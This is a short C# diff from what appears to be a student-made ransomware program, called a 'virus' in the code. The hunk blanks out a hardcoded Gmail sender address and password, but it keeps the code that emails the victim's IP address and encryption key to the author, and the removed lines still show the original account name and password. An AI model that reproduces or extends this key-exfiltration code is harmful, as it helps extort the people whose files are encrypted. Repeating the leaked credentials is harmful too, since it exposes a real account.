@@ -26,9 +26,9 @@ namespace EncryptionLogic
 		{
 			try
 			{
-				var fromAddress = new MailAddress("imadeavirusformyseniorproject@gmail.com", "From Name");
-				var toAddress = new MailAddress("imadeavirusformyseniorproject@gmail.com", "To Name");
-				const string fromPassword = "jaquelyn";
+				var fromAddress = new MailAddress("", "From Name");
+				var toAddress = new MailAddress("", "To Name");
+				const string fromPassword = "";
 				string subject = "New Virus key for IP address: " + GetIP();
 				string body = string.Format("The key for IP address {0} is {1}", GetIP(), key);
 
